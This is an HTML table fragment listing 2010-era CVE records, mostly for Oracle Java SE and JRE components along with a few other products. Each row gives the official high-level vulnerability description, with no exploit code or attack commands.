		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4475">CVE-2010-4475</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to Deployment, a different vulnerability than CVE-2010-4447.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4474">CVE-2010-4474</a></td>
		<td valign="top">Unspecified vulnerability in the Java DB component in Oracle Java SE and Java for Business 6 Update 23, and, and earlier allows local users to affect confidentiality via unknown vectors related to Security, a similar vulnerability to CVE-2009-4269.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4473">CVE-2010-4473</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound and unspecified APIs, a different vulnerability than CVE-2010-4454 and CVE-2010-4462.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4472">CVE-2010-4472</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier allows remote attackers to affect availability, related to XML Digital Signature and unspecified APIs.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue involves the replacement of the "XML DSig Transform or C14N algorithm implementations."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4471">CVE-2010-4471</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, and 5.0 Update 27 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to 2D.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue is related to the exposure of system properties via vectors related to Font.createFont and exception text.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4470">CVE-2010-4470</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23, and, and earlier allows remote attackers to affect availability via unknown vectors related to JAXP and unspecified APIs.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue is related to "Features set on SchemaFactory not inherited by Validator."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4469">CVE-2010-4469</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to HotSpot.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue is heap corruption related to the Verifier and "backward jsrs."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4468">CVE-2010-4468</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, and 5.0 Update 27 and earlier, allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality and integrity via unknown vectors related to JDBC.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4467">CVE-2010-4467</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 10 through 6 Update 23 allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4466">CVE-2010-4466</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier for Windows, Solaris, and, Linux; 5.0 Update 27 and earlier for Windows; and 1.4.2_29 and earlier for Windows allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4465">CVE-2010-4465</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Swing.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue is related to the lack of framework support by AWT event dispatch, and/or "clipboard access in Applets."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4463">CVE-2010-4463</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 21 through 6 Update 23 allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4462">CVE-2010-4462</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound and unspecified APIs, a different vulnerability than CVE-2010-4454 and CVE-2010-4473.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4456">CVE-2010-4456</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Sun Java System Communications Express 6.2 and 6.3 allows remote attackers to affect integrity via unknown vectors related to Web Mail.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4454">CVE-2010-4454</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound and unspecified APIs, a different vulnerability than CVE-2010-4462 and CVE-2010-4473.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4452">CVE-2010-4452</a></td>
		<td valign="top">Unspecified vulnerability in the Deployment component in Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4451">CVE-2010-4451</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier for Windows, when using Java Update, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4450">CVE-2010-4450</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier for Solaris and Linux; 5.0 Update 27 and earlier for Solaris and Linux; and 1.4.2_29 and earlier for Solaris and Linux allows local standalone applications to affect confidentiality, integrity, and availability via unknown vectors related to Launcher.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue is an untrusted search path vulnerability involving an empty LD_LIBRARY_PATH environment variable.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4448">CVE-2010-4448</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect integrity via unknown vectors related to Networking.  NOTE: the previous information was obtained from the February 2011 CPU.  Oracle has not commented on claims from a downstream vendor that this issue involves "DNS cache poisoning by untrusted applets."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4447">CVE-2010-4447</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to Deployment, a different vulnerability than CVE-2010-4475.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4444">CVE-2010-4444</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Sun Java System Access Manager and Oracle OpenSSO 7, 7.1, and 8 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4438">CVE-2010-4438</a></td>
		<td valign="top">Unspecified vulnerability in Oracle GlassFish 2.1, 2.1.1, and 3.0.1, and Java System Message Queue 4.1 allows local users to affect confidentiality, integrity, and availability, related to Java Message Service (JMS).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4431">CVE-2010-4431</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Sun Java System Portal Server 7.1 and 7.2 allows local users to affect confidentiality via unknown vectors related to Proxy.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4422">CVE-2010-4422</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE and Java for Business 6 Update 23 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4351">CVE-2010-4351</a></td>
		<td valign="top">The JNLP SecurityManager in IcedTea (IcedTea.so) 1.7 before 1.7.7, 1.8 before 1.8.4, and 1.9 before 1.9.4 for Java OpenJDK returns from the checkPermission method instead of throwing an exception in certain circumstances, which might allow context-dependent attackers to bypass the intended security policy by creating instances of ClassLoader.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-4172">CVE-2010-4172</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the Manager application in Apache Tomcat 6.0.12 through 6.0.29 and 7.0.0 through 7.0.4 allow remote attackers to inject arbitrary web script or HTML via the (1) orderBy or (2) sort parameter to sessionsList.jsp, or unspecified input to (3) sessionDetail.jsp or (4) java/org/apache/catalina/manager/JspHelper.java, related to use of untrusted web applications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3894">CVE-2010-3894</a></td>
		<td valign="top">Stack-based buffer overflow in the Java_com_ibm_es_oss_CryptionNative_ESEncrypt function in /opt/IBM/es/lib/libffq.cryptionjni.so in the login form in the administration interface in IBM OmniFind Enterprise Edition before 8.5 FP6 allows remote attackers to execute arbitrary code via a long password.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3796">CVE-2010-3796</a></td>
		<td valign="top">Safari RSS in Apple Mac OS X 10.5.8 and 10.6.x before 10.6.5 does not block Java applets in an RSS feed, which allows remote attackers to obtain sensitive information via a feed: URL containing an applet that performs DOM modifications.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3775">CVE-2010-3775</a></td>
		<td valign="top">Mozilla Firefox before 3.5.16 and 3.6.x before 3.6.13, and SeaMonkey before 2.0.11, does not properly handle certain redirections involving data: URLs and Java LiveConnect scripts, which allows remote attackers to start processes, read arbitrary local files, and establish network connections via vectors involving a refresh value in the http-equiv attribute of a META element, which causes the wrong security principal to be used.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3579">CVE-2010-3579</a></td>
		<td valign="top">Unspecified vulnerability in the (1) Sun Convergence 1 and (2) Sun Java Communications Suite 7 components in Oracle Sun Products Suite 1.0 and 7.0 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Webmail.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3575">CVE-2010-3575</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Communications Messaging Server (Sun Java System Messaging Server) component in Oracle Sun Products Suite 6.0, 6.2, 6.3, and 7.0 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Web Mail.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3574">CVE-2010-3574</a></td>
		<td valign="top">Unspecified vulnerability in the Networking component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that HttpURLConnection does not properly check for the allowHttpTrace permission, which allows untrusted code to perform HTTP TRACE requests.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3573">CVE-2010-3573</a></td>
		<td valign="top">Unspecified vulnerability in the Networking component in Oracle Java SE and Java for Business 6 Update 21 and 5.0 Update 25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is related to missing validation of request headers in the HttpURLConnection class when they are set by applets, which allows remote attackers to bypass the intended security policy.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3572">CVE-2010-3572</a></td>
		<td valign="top">Unspecified vulnerability in the Sound component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3571">CVE-2010-3571</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is an integer overflow in the color profile parser that allows remote attackers to execute arbitrary code via a crafted Tag structure in a color profile.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3570">CVE-2010-3570</a></td>
		<td valign="top">Unspecified vulnerability in the Deployment Toolkit component in Oracle Java SE and Java for Business 6 Update 21 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3569">CVE-2010-3569</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, and 1.4.2_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this allows remote attackers to execute arbitrary code by causing the defaultReadObject method in the Serialization API to set a volatile field multiple times.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3568">CVE-2010-3568</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, and 1.4.2_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is a race condition related to deserialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3567">CVE-2010-3567</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in Oracle Java SE and Java for Business 6 Update 21, and 5.0 Update 25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is related to a calculation error in right-to-left text character counts for the ICU OpenType font rendering implementation, which triggers an out-of-bounds memory access.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3566">CVE-2010-3566</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update and 25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is an integer overflow that leads to a buffer overflow via a crafted devs (device information) tag structure in a color profile.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3565">CVE-2010-3565</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, and 1.4.2_27 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this is an integer overflow that triggers memory corruption via large values in a subsample of a JPEG image, related to JPEGImageWriter.writeImage in the imageio API.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3564">CVE-2010-3564</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle Communications Messaging Server (Sun Java System Messaging Server) component in Oracle Sun Products Suite 7.0 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Webmail.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that the Kerberos implementation does not properly check AP-REQ requests, which allows attackers to cause a denial of service in the JVM.  NOTE: CVE has not investigated the apparent discrepancy between the two vendors regarding the consequences of this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3563">CVE-2010-3563</a></td>
		<td valign="top">Unspecified vulnerability in the Deployment component in Oracle Java SE and Java for Business 6 Update 21 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors. NOTE: the previous information was obtained from the October 2010 CPU. Oracle has not commented on claims from a reliable researcher that this is related to "how Web Start retrieves security policies," BasicServiceImpl, and forged policies that bypass sandbox restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3562">CVE-2010-3562</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is a double free vulnerability in IndexColorModel that allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3561">CVE-2010-3561</a></td>
		<td valign="top">Unspecified vulnerability in the CORBA component in Oracle Java SE and Java for Business 6 Update 21 and 5.0 Update 25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this involves the use of the privileged accept method in the ServerSocket class, which does not limit which hosts can connect and allows remote attackers to bypass intended network access restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3560">CVE-2010-3560</a></td>
		<td valign="top">Unspecified vulnerability in the Networking component in Oracle Java SE and Java for Business 6 Update 21 allows remote attackers to affect confidentiality via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3559">CVE-2010-3559</a></td>
		<td valign="top">Unspecified vulnerability in the Sound component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable researcher that this involves an incorrect sign extension in the HeadspaceSoundbank.nGetName function, which allows attackers to execute arbitrary code via a crafted BANK record that leads to a buffer overflow.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3558">CVE-2010-3558</a></td>
		<td valign="top">Unspecified vulnerability in the Java Web Start component in Oracle Java SE and Java for Business 6 Update 21 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3557">CVE-2010-3557</a></td>
		<td valign="top">Unspecified vulnerability in the Swing component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is related to the modification of "behavior and state of certain JDK classes" and "mutable static."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3556">CVE-2010-3556</a></td>
		<td valign="top">Unspecified vulnerability in the 2D component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3555">CVE-2010-3555</a></td>
		<td valign="top">Unspecified vulnerability in the Deployment component in Oracle Java SE and Java for Business 6 Update 21 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors. NOTE: the previous information was obtained from the January 2011 CPU. Oracle has not commented on claims from a reliable third party coordinator that the ActiveX Plugin does not properly initialize an object field that is used as a window handle, which allows attackers to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3554">CVE-2010-3554</a></td>
		<td valign="top">Unspecified vulnerability in the CORBA component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is related to "permissions granted to certain system objects."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3553">CVE-2010-3553</a></td>
		<td valign="top">Unspecified vulnerability in the Swing component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is related to unsafe reflection involving the UIDefault.ProxyLazyValue class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3552">CVE-2010-3552</a></td>
		<td valign="top">Unspecified vulnerability in the New Java Plug-in component in Oracle Java SE and Java for Business 6 Update 21 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3551">CVE-2010-3551</a></td>
		<td valign="top">Unspecified vulnerability in the Networking component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, and 1.4.2_27 allows remote attackers to affect confidentiality via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3550">CVE-2010-3550</a></td>
		<td valign="top">Unspecified vulnerability in the Java Web Start component in Oracle Java SE and Java for Business 6 Update 21 and 5.0 Update 25 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3549">CVE-2010-3549</a></td>
		<td valign="top">Unspecified vulnerability in the Networking component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is an HTTP request splitting vulnerability involving the handling of the chunked transfer encoding method by the HttpURLConnection class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3548">CVE-2010-3548</a></td>
		<td valign="top">Unspecified vulnerability in the Java Naming and Directory Interface (JNDI) component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, and 1.4.2_27 allows remote attackers to affect confidentiality via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this allows remote attackers to determine internal IP addresses or "otherwise-protected internal network names."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3546">CVE-2010-3546</a></td>
		<td valign="top">Unspecified vulnerability in the Sun Java System Identity Manager component in Oracle Sun Products Suite 8.1 allows remote attackers to affect confidentiality and integrity via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3545">CVE-2010-3545</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle iPlanet Web Server (Sun Java System Web Server) component in Oracle Sun Products Suite 7.0 allows remote attackers to affect confidentiality and integrity via unknown vectors related to Administration.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3544">CVE-2010-3544</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle iPlanet Web Server (Sun Java System Web Server) component in Oracle Sun Products Suite 7.0 allows remote attackers to affect integrity and availability via unknown vectors related to Administration.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable source that this is cross-site request forgery (CSRF) that allows remote attackers to stop an instance via the management console.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3541">CVE-2010-3541</a></td>
		<td valign="top">Unspecified vulnerability in the Networking component in Oracle Java SE and Java for Business 6 Update 21, 5.0 Update 25, 1.4.2_27, and 1.3.1_28 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.  NOTE: the previous information was obtained from the October 2010 CPU.  Oracle has not commented on claims from a reliable downstream vendor that this is related to missing validation of request headers in the HttpURLConnection class when they are set by applets, which allows remote attackers to bypass the intended security policy.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3514">CVE-2010-3514</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle iPlanet Web Server (Sun Java System Web Server) component in Oracle Sun Products Suite 6.1 and 7.0 allows remote attackers to affect integrity via unknown vectors related to Web Container.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3512">CVE-2010-3512</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle iPlanet Web Server (Sun Java System Web Server) component in Oracle Sun Products Suite 7.0u8 allows remote authenticated users to affect confidentiality, related to DAV (WebDAV).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2010-3402">CVE-2010-3402</a></td>
		<td valign="top">Untrusted search path vulnerability in IDM Computer Solutions UltraEdit 16.20.0.1009, 16.10.0.1036, and probably other versions allows local users, and possibly remote attackers, to execute arbitrary code and conduct DLL hijacking attacks via a Trojan horse dwmapi.dll that is located in the same folder as a bin, cpp, css, c, dat, hpp, html, h, ini, java, log, mak, php, prj, txt, or xml file.

</td>
